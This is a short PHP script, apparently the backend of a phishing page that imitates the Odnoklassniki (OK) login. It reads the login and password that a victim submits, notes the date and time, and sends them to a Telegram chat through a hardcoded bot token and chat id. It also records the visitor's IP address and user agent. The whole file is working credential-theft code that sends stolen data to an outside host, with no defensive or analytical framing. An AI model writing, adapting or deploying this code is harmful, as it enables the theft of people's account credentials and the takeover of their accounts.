<?php

/* В переменной token указываем токен бота который выдал @BotFather */
$token = "5376707185:AAHHYj3AATNCBun2Cvyi79zkQC5VHyAhC4s"; //Токен бота с @BotFather
/* В переменной chat_id указываем либо ваш личный id либо id группы куда будут лететь уведомления (созданного бота нужно будет добавить в группу) */
$chat_id = "-658516243"; // Chat_id / Group_id
/* Передает юзерагент пользователя */
$useragents = $_SERVER['HTTP_USER_AGENT'];
/* Передает IP адрес пользователя */
$ip = $_SERVER['REMOTE_ADDR'];

$arr = array(
  ' ' => '✅Новий акаунт OK✅',
  'Логін: ' => $_POST['ok_login'],
  'Пароль: ' => $_POST['password_ok'],
  'Дата:' => date('d.m.Y'),
  'Час:' =>date('H:i:s')
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

?>